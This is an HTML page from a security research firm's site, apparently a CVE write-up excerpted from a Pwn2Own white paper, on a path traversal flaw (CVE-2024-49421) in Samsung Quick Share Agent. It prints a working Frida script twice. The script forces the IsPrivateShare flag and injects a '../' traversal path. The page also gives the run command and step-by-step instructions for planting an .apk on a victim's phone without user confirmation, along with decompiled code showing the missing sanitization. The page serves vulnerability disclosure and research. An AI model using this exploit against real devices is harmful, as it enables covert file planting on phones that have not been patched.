<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Samsung Quick Share Agent Path Traversal - CVE-2024-49421 | Malicious Erection LLC</title>
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="Samsung Quick Share Agent Path Traversal - CVE-2024-49421" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Path traversal in Quick Share Agent prior to version 3.5.14.47 in Android 12, 3.5.19.41 in Android 13, and 3.5.19.42 in Android 14 allows adjacent attackers to write file in arbitrary location." />
<meta property="og:description" content="Path traversal in Quick Share Agent prior to version 3.5.14.47 in Android 12, 3.5.19.41 in Android 13, and 3.5.19.42 in Android 14 allows adjacent attackers to write file in arbitrary location." />
<link rel="canonical" href="https://maliciouserection.com/cves/2024-12-01_cve-2024-49421/" />
<meta property="og:url" content="https://maliciouserection.com/cves/2024-12-01_cve-2024-49421/" />
<meta property="og:site_name" content="Malicious Erection LLC" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-01T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Samsung Quick Share Agent Path Traversal - CVE-2024-49421" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-01T00:00:00+00:00","datePublished":"2024-12-01T00:00:00+00:00","description":"Path traversal in Quick Share Agent prior to version 3.5.14.47 in Android 12, 3.5.19.41 in Android 13, and 3.5.19.42 in Android 14 allows adjacent attackers to write file in arbitrary location.","headline":"Samsung Quick Share Agent Path Traversal - CVE-2024-49421","mainEntityOfPage":{"@type":"WebPage","@id":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49421/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://maliciouserection.com/assets/images/logo.png"}},"url":"https://maliciouserection.com/cves/2024-12-01_cve-2024-49421/"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
    />
    <link rel="stylesheet" href="/assets/css/main.css" />
  </head>

  <body class="flex flex-col h-screen antialiased">
    <div 
  class="flex-none bg-base-100 shadow-sm h-20 navbar"
  style="height: 10rem;"
>
  <div 
    class="flex-none navbar-start"
    style="height: 9rem;"
  >
    <div class="shadow-lg dropdown">
      <div tabindex="0" role="button" class="lg:hidden btn btn-ghost">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          class="w-5 h-5"
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            stroke-width="2"
            d="M4 6h16M4 12h8m-8 6h16"
          />
        </svg>
      </div>
      <ul
        tabindex="0"
        class="z-[1] space-y-5 bg-base-100 shadow mt-3 p-2 rounded-box w-72 menu menu-sm dropdown-content"
      >
        
        <li class="text-secondary text-lg">
          <a href="/">Home</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/blog">Blog</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/tools">Tools</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
        </li>
        
        <li class="text-secondary text-lg">
          <a href="/cves">CVEs</a>
        </li>
        
      </ul>
    </div>
    <a 
      href="/" 
      title="Malicious Erection LLC" 
      class="px-5"
      style="height: 7rem;"
    >
      <img
        src="/assets/images/logo.png"
        alt="Malicious Erection LLC"
        class="w-32 object-center image-center"
        style="width: 15rem;"
      />
    </a>
  </div>
  <div class="hidden lg:flex flex-1 gap-3 navbar-end">
    <ul class="gap-3 px-1 menu menu-horizontal">
      
      <li class="font-semibold text-base">
        <a href="/">Home</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/blog">Blog</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/tools">Tools</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/vulnerability-disclosure-policy">Vulnerability Disclosure Policy</a>
      </li>
      
      <li class="font-semibold text-base">
        <a href="/cves">CVEs</a>
      </li>
      
    </ul>
  </div>
</div>

    <div class="flex-1 overflow-y-auto">
      <div class="min-h-[80vh]"><main>
  <!-- Header Section -->
  <section class="flex justify-center items-center bg-secondary/75 py-16">
    <h1 class="font-bold text-neutral-content text-5xl text-center">Samsung Quick Share Agent Path Traversal - CVE-2024-49421</h1>
  </section>

  <!-- Content Section -->
  <section class="mx-auto py-10 text-neutral-content prose px-4 sm:px-6 lg:px-8 max-w-full lg:max-w-5xl xl:max-w-[1100px]">
    <p>The below snippet is taken from the full white paper, available here: <a href="/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html">https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html</a></p>

<p>I think you should read the white paper instead :)</p>

<hr />

<h4 id="exploit-payload">Exploit Payload</h4>

<p>A Frida script (or Xposed Module) can be used to exploit this issue. Run the following Frida Script on an attacker controlled phone:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console.log("script loaded");
Java.perform(function() {

    var yayclass1yay = Java.use('e2.t');

    yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) {

        if (a.has("IsPrivateShare")) {
            a.put("IsPrivateShare", true)
        }
        if (a.has("Path")) {
            a.put("Path","/../../../../../../GPUWatch_Dump/html/")
        }
        var ret_val = this.n(a,b,c);
        console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n")
        return ret_val;
    }
});
</code></pre></div></div>

<p>The attacker controlled phone should then share a file on their phone via Quick Share. Take note of the QR code URL that is generated on the attacker controlled phone generate. That QR code URL should then be used to launch Quick Share on the target phone.</p>

<p>NOTE: the <code class="language-plaintext highlighter-rouge">GPUWatch_Dump/html/</code> value in the above script is strictly used for this exploit chain.</p>

<h4 id="exploit-details">Exploit Details</h4>

<p>The application “Quick Share Agent” (<code class="language-plaintext highlighter-rouge">com.samsung.android.aware.service</code> version 3.5.19.33) is a background application that runs alongside the Quick Share application. When sending and receiving files via Quick Share, it is actually Quick Share Agent that handles connections to remote phones and sending/receiving files.</p>

<p>In Quick Share Agent, the class <code class="language-plaintext highlighter-rouge">e2.t</code> handles:</p>

<ul>
  <li>Managing a Socket connection between phones</li>
  <li>Sending data to the remote device</li>
  <li>Receiving data from the remote device</li>
</ul>

<p>When sending a file, two JSON messages are sent before sending the file(s). The first message establishes information about the connection, and two fields are of interest for this exploit chain:</p>

<ul>
  <li>What type of data is being sent (File/Folder)</li>
  <li>If the transfer is considered a “PrivateShare”, which is a Samsung exclusive function to encrypt the file being sent</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "TotalBytes": 3322214,
  "TotalCount": 1,
  "ItemType": "File",
  "IsAlbumShare": true,
  "IsPrivateShare": false,
  "SenderFriendlyName": "YayAttackerPhoneYay",
  "TransportDescription": "",
  ...
</code></pre></div></div>

<p>The second message contains information about the file/folder being sent. Two fields are of interest for this exploit chain:</p>

<ul>
  <li>Name</li>
  <li>Path</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "Name": "Yay.jpg",
  "TotalBytes": 3322214,
  "Path":"\/storage\/emulated\/0\/ShareViaWifi\/Yay.jpg",
  "Url": "ftcp_url_0_",
  ...
</code></pre></div></div>

<p>When the second message is received, Quick Share Agent passes the received JSON string to class <code class="language-plaintext highlighter-rouge">f2.i</code> method <code class="language-plaintext highlighter-rouge">s(JSONObject)</code>. From there, Name and Path are passed to two different sanitization functions, depending on if class <code class="language-plaintext highlighter-rouge">x1.b</code> method <code class="language-plaintext highlighter-rouge">x()</code> returns <code class="language-plaintext highlighter-rouge">True</code> or <code class="language-plaintext highlighter-rouge">False</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class i implements k.c, c.c {
    public final b b;
...
    public final f2.l s(JSONObject yayreceivedjsonyay) {
        ...
        String yaynameyay;
        String yaypathyay;
        if(this.b.x()) {
            // no sanitization
            yaynameyay = yayreceivedjsonyay.optString("Name", "Unknown.dat");
            yaypathyay = yayreceivedjsonyay.optString("Path");
        }
        else {
            // sanitize Name and Path
            String yaytemp1yay = yayreceivedjsonyay.optString("Name", "Unknown.dat");
            yaynameyay = new k5.i("[:\"&lt;&gt;*?|/\u0000-\u001F\u007F\\\\]").e (yaytemp1yay, "-"); // sanitizes name
            String yaytemp2yay = yayreceivedjsonyay.optString("Path");
            yaypathyay = new k5.i("[:\"&lt;&gt;*?|\u0000-\u001F\u007F\\\\]").e(yaytemp2yay, "-");
        }
</code></pre></div></div>

<p>Looking at class <code class="language-plaintext highlighter-rouge">x1.b</code> method <code class="language-plaintext highlighter-rouge">x()</code>, the return value was dependent on the value of the static Boolean value <code class="language-plaintext highlighter-rouge">h</code>. And the value of <code class="language-plaintext highlighter-rouge">h</code> is dependent on whatever executes the method <code class="language-plaintext highlighter-rouge">J(boolean)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class b {
    public boolean h;
    ...
    public final void J(boolean z5) {
        this.h = z5;
    }
    ...
    public final boolean x() {
        return this.h;
    }
</code></pre></div></div>

<p>Previously, it was mentioned that 2 JSON messages are sent to the receiving phone. The first message is processed in class <code class="language-plaintext highlighter-rouge">f2.i</code> method <code class="language-plaintext highlighter-rouge">D(c, JSONObject)</code>. In one part of that method, the value related to the key <code class="language-plaintext highlighter-rouge">IsPrivateShare</code> is extracted and then is passed as an argument to class <code class="language-plaintext highlighter-rouge">x1.b</code> method <code class="language-plaintext highlighter-rouge">J(boolean)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class i implements k.c, c.c {
...
    public final boolean D(c c, JSONObject yayjsonobjectyay) {
        ...
        this.g.J(yayjsonobjectyay.optBoolean("IsPrivateShare", false));
</code></pre></div></div>

<h4 id="bug-4--isprivateshare-is-attacker-controlled-resulting-in-a-path-traversal-attack">BUG 4 – IsPrivateShare is attacker controlled, resulting in a Path Traversal attack</h4>

<p>When receiving a file/folder from an attacker controlled phone, and the attacker controlled phone sends a IsPrivateShare value of True, then the attacker controlled phone can force the target phone to save the incoming file into any directory that Quick Share Agent has write access to.</p>

<p>In our exploit chain, we use this vulnerability to save a Drozer .apk file onto the victim’s phone at the location <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>. In order to do this, first run the following Frida command. Note that you might have to share a file normally first in order to start the Quick Share Agent service:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ frida -U -l yayscriptyay.js com.samsung.android.aware.service
</code></pre></div></div>
<p>Below is the contents of yayscriptyay.js. This script will:</p>

<ul>
  <li>Intercept all JSON messages that are intended to be sent to the receiving phone</li>
  <li>Change the IsPrivateShare value to True</li>
  <li>Change the Path value to <code class="language-plaintext highlighter-rouge">/../../../../../../GPUWatch_Dump/html/</code></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console.log("script loaded");
Java.perform(function() {

    var yayclass1yay = Java.use('e2.t');

    yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) {

        if (a.has("IsPrivateShare")) {
            a.put("IsPrivateShare", true)
        }
        if (a.has("Path")) {
            a.put("Path","/../../../../../../GPUWatch_Dump/html/")
        }
        var ret_val = this.n(a,b,c);
        console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n")
        return ret_val;
    }
});
</code></pre></div></div>

<p>NOTE: the number of “../” in the new Path value matters. When Quick Share “downloads a folder” from a phone, it actually performs the following steps:</p>

<ol>
  <li>Creates a new directory <code class="language-plaintext highlighter-rouge">/storage/emulated/0/Android/data/com.samsung.android.aware.service/files/&lt;session_id&gt;/</code></li>
  <li>The folder(s) defined in the Path value are created in the above mentioned directory</li>
  <li>The file(s) that are in the sender’s phone are sent to the receiving phone, and saved in the above newly created directory</li>
  <li>Once all files are sent, the above newly created directory is copied to <code class="language-plaintext highlighter-rouge">/storage/emulated/0/Download/Quick Share/</code></li>
</ol>

<p>The number of “../” ensures that during the folder creation process (step 2), the folder(s) are created in the <code class="language-plaintext highlighter-rouge">/storage/emulated/0/</code> directory.</p>

<p>Once the Frida script is running, place the .apk file into any directory on the attacker controlled phone. Then share the folder and select “Quick Share”. Finally, generate a QR code for the share by tapping “QR code or link”.</p>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-3.png" />
</div>

<p>Now when someone tries to download the folder, yay.apk will be placed in <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>e1s:/storage/emulated/0 # ls ./GPUWatch_Dump/html/
yay.apk
</code></pre></div></div>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-4.png" />
</div>

<p>For our exploit chain, when the attacker phone generates a QR code, the random code at the end of the URL should be used in bug 4. This will force the target phone to download the .apk file automatically without user confirmation.</p>

  </section>

  <!-- CTA Button (optional) -->
  
</main>
</div>
      <div class="bg-neutral-800">
  <footer class="mx-auto py-10 container">
    <div class="flex flex-wrap justify-center gap-3 mb-10 align-center">
      
      <a href="/" class="btn btn-secondary btn-ghost"
        >Home</a
      >
      
      <a href="/blog/" class="btn btn-secondary btn-ghost"
        >Blog</a
      >
      
      <a href="/tools" class="btn btn-secondary btn-ghost"
        >Tools</a
      >
      
      <a href="/vulnerability-disclosure-policy" class="btn btn-secondary btn-ghost"
        >Vulnerability Disclosure Policy</a
      >
      
      <a href="/cves/" class="btn btn-secondary btn-ghost"
        >CVEs</a
      >
      
    </div>
    <div class="flex justify-center items-center gap-3 mb-10">
      
      <a
        title="Github"
        href="https://github.com/MaliciousErection"
        class="btn btn-ghost btn-circle"
      >
        <i class="fa fa-github text-xl"></i>
      </a>
      
    </div>
    <p class="text-center">© 2025 Malicious Erection LLC.</p>
  </footer>
</div>

    </div>
  </body>
</html>
